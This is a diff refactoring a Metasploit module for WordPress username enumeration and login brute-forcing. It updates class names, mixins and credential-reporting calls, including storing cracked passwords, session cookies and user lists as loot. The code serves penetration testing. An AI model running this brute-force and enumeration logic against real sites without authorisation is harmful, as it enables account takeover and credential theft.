@@ -1,10 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class Metasploit3 < Msf::Auxiliary
-  include Msf::HTTP::Wordpress
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Report
@@ -17,7 +17,6 @@ class Metasploit3 < Msf::Auxiliary
       'Description'   => 'WordPress Authentication Brute Force and User Enumeration Utility',
       'Author'        =>
         [
-          'Alligator Security Team',
           'Tiago Ferreira <tiago.ccna[at]gmail.com>',
           'Zach Grace <zgrace[at]404labs.com>',
           'Christian Mehlmauer'
@@ -38,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
         OptBool.new('ENUMERATE_USERNAMES', [ true, 'Enumerate usernames', true ]),
         OptInt.new('RANGE_START', [false, 'First user id to enumerate', 1]),
         OptInt.new('RANGE_END', [false, 'Last user id to enumerate', 10])
-    ], self.class)
+    ])
 
   end
 
@@ -107,14 +106,14 @@ class Metasploit3 < Msf::Auxiliary
     exists = wordpress_user_exists?(user)
     if exists
       print_good("#{target_uri} - WordPress User-Validation - Username: '#{user}' - is VALID")
-      report_auth_info(
-          :host => rhost,
-          :sname => (ssl ? 'https' : 'http'),
-          :user => user,
-          :port => rport,
-          :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}"
-      )
+      connection_details = {
+        module_fullname: self.fullname,
+        username: user,
+        workspace_id: myworkspace_id,
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }.merge(service_details)
 
+      framework.db.create_credential_and_login(connection_details)
       @users_found[user] = :reported
       return :next_user
     else
@@ -131,15 +130,9 @@ class Metasploit3 < Msf::Auxiliary
 
     if cookie
       print_good("#{target_uri} - WordPress Brute Force - SUCCESSFUL login for '#{user}' : '#{pass}'")
-      report_auth_info(
-          :host => rhost,
-          :port => rport,
-          :sname => (ssl ? 'https' : 'http'),
-          :user => user,
-          :pass => pass,
-          :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}, COOKIE=#{cookie}",
-          :active => true
-      )
+
+      store_valid_credential(user: user, private: pass, proof: cookie)
+
       return :next_user
     else
       vprint_error("#{target_uri} - WordPress Brute Force - Failed to login as '#{user}'")
@@ -159,7 +152,7 @@ class Metasploit3 < Msf::Auxiliary
 
     if not usernames.empty?
       p = store_loot('wordpress.users', 'text/plain', rhost, usernames * "\n", "#{rhost}_wordpress_users.txt")
-      print_status("#{target_uri} - Usernames stored in: #{p}")
+      print_good("#{target_uri} - Usernames stored in: #{p}")
     end
 
     return usernames
